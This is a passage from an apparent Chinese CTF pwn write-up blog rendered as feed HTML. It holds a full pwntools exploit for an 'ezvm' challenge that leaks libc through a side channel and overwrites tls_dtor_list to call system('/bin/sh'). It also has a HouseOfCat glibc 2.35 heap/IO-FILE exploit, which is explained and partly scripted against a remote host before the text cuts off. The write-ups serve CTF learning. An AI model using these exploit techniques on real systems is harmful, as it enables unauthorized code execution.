class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_byte</span>(<span class="hljs-params">addr_offset,byte_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    payload = [<br>        load(<span class="hljs-number">0</span>,addr_offset),push(<span class="hljs-number">0</span>),<br>        mov(<span class="hljs-number">0</span>,byte_offset*<span class="hljs-number">8</span>),push(<span class="hljs-number">0</span>),rshift(),<br>        mov(<span class="hljs-number">0</span>,<span class="hljs-number">0xff</span>),push(<span class="hljs-number">0</span>),And(),pop(<span class="hljs-number">0</span>), <span class="hljs-comment"># Reg0 = real_byte</span><br>        mov(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),mov(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 for guess byte;Reg2 as tool-reg for += 1</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">0</span>),<br>        eq(),   <span class="hljs-comment"># While Reg1 != Reg0</span><br>        jnz(<span class="hljs-number">0x58</span>+<span class="hljs-number">3</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x42</span>), <span class="hljs-comment"># If Reg1 == Reg0, go RETURN (Debug to attain ip_offset)</span><br>        other(), <span class="hljs-comment"># Side-channel Leak --- each time puts a line of &quot;what???&quot;</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">2</span>),add(),pop(<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 += 1</span><br>        jmp((<span class="hljs-number">0x38</span>+<span class="hljs-number">4</span>-<span class="hljs-number">0x53</span>-<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffffffffffffffff</span>), <span class="hljs-comment"># continue</span><br>        halt() <span class="hljs-comment"># return</span><br>    ]<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_addr</span>(<span class="hljs-params">addr_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    addr = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;&#x27;</span>.join(leak_byte(addr_offset,<span class="hljs-number">8</span>-<span class="hljs-number">1</span>-i)))<br>        pc = <span class="hljs-number">0</span><br>        side_data = ru(<span class="hljs-string">&quot;finish&quot;</span>)<br>        leaked_byte = side_data.count(<span class="hljs-string">&quot;what???&quot;</span>)<br>        lg(<span class="hljs-string">&#x27;BYTE[%d]&#x27;</span>%(<span class="hljs-number">8</span> - <span class="hljs-number">1</span> -i),leaked_byte)<br>        addr &lt;&lt;= <span class="hljs-number">8</span><br>        addr += leaked_byte<br>    <span class="hljs-keyword">return</span> addr<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do Leak</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x3000</span>//<span class="hljs-number">8</span>,halt())<br>libc_leak = leak_addr(<span class="hljs-number">0</span>)<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do OOB Write</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>fskey = -<span class="hljs-number">0x2890</span> + libc_base<br>tls_dtor_list = -<span class="hljs-number">0x2918</span> + libc_base<br>memory = -<span class="hljs-number">0x25ff0</span> +libc_base <br>code = mov(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,(fskey-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># fskey = 0</span><br>code += mov(<span class="hljs-number">0</span>,tls_dtor_list+<span class="hljs-number">8</span>) + store(<span class="hljs-number">0</span>,(tls_dtor_list-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># tls_dtor_list = &amp;tls_dtor_list + 8</span><br>code += mov(<span class="hljs-number">0</span>,rol(system_addr,<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">8</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 8) = rol(__libc_system,0x11,64)  # RIP</span><br>code += mov(<span class="hljs-number">0</span>,bin_sh) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">0x10</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 0x10) = rol(__libc_system,0x11,64) # RDI</span><br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x22000</span>//<span class="hljs-number">8</span>,code)<br><br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babysnitch-10-Solved-Working…"><a class="header-anchor" href="#babysnitch-10-Solved-Working…">¶</a>babysnitch (10 Solved)(Working…)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162517106.png" alt="babysnitch"></p><h3 id="题目描述-v3"><a class="header-anchor" href="#题目描述-v3">¶</a>题目描述</h3><p>I have my application firewall installed. It should protect my flag even against RCE. Isn’t It?</p><p><a href="https://drive.google.com/file/d/1A-isglKqxCjePSDtRMTN0mJ2ep8NTyC6/view?usp=sharing">attachment</a></p><h3 id="题目分析-v2"><a class="header-anchor" href="#题目分析-v2">¶</a>题目分析</h3><h2 id="qqbot-3-Solved-Working…"><a class="header-anchor" href="#qqbot-3-Solved-Working…">¶</a>qqbot (3 Solved)(Working…)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162924198.png" alt="qqbot"></p><h3 id="题目描述-v4"><a class="header-anchor" href="#题目描述-v4">¶</a>题目描述</h3><p>We prepare some bots for you, fool one of them and get flag. + qqbot01@localhost + qqbot02@localhost + qqbot03@localhost + qqbot04@localhost + qqbot05@localhost The bot is on ubuntu 20.04 and flag in <code>/flag</code></p><p><a href="https://drive.google.com/file/d/1eBb4Cmm-dVQ4Z914hzICthOH8iMjedp_/view?usp=sharing">attachment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 强网杯初赛 Pwn 部分题解及赛后复现</title>
    <link href="/posts/cfd0f35d.html"/>
    <url>/posts/cfd0f35d.html</url>
    
    <content type="html"><![CDATA[<p>18 道 pwn ，把 👴 给冲烂了，给 👴 带来了巨大的心灵震撼与阴影。👴 比较菜，比赛时也就出了比较简单的三道，其他的 👴 是真的不会，👴 下去好好反思。</p><h3 id="HouseOfCat"><a class="header-anchor" href="#HouseOfCat">¶</a>HouseOfCat</h3><h4 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h4><p>一血题，套了IOT板子的 2.35 版本下 <strong>UAF</strong> 利用。</p><p><strong>核心思路</strong>：在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p><p>一次 Largebin 打 stderr，一次 Largebin 打 main_arena Topchunk 地址，走 kiwi 触发 IO 流利用 <code>_wide_data</code> 成员控制执行流完成 orw。</p><p>需要注意的是 Edit 提供的写入字节数明显不足，需要在 Add 时提前布置好 payload。</p><h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">IO_FILE</span>(<span class="hljs-params">_flags = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_backup_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_marker = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_chain = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _fileno = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _lock = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _wide_data = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _mode = <span class="hljs-number">0</span></span>):<br>    fake_IO_FILE = p32(_flags) + \<br>             p32(<span class="hljs-number">0</span>) + \<br>             p64(_IO_read_ptr) + \<br>             p64(_IO_read_end) + \<br>             p64(_IO_read_base) + \<br>             p64(_IO_write_base) + \<br>             p64(_IO_write_ptr) + \<br>             p64(_IO_write_end) + \<br>             p64(_IO_buf_base) + \<br>             p64(_IO_buf_end) + \<br>             p64(_IO_save_base) + \<br>             p64(_IO_backup_base) + \<br>             p64(_IO_save_end) + \<br>             p64(_IO_marker) + \<br>             p64(_IO_chain) + \<br>             p32(_fileno)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_lock)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_wide_data)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_mode)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">return</span> fake_IO_FILE<br><br>elf = ELF(<span class="hljs-string">&#x27;./house_of_cat&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./house_of_cat&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;59.110.212.61&#x27;</span>,<span class="hljs-number">16938</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;LOGIN \x7C r00t QWB QWXFadmin\0&#x27;&#x27;&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;CAT  \x7C r00t QWB QWXF&#x27;&#x27;&#x27;</span>+p32(<span class="hljs-number">0x0FFFFFFFF</span>)+<span class="hljs-string">&#x27;$&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span 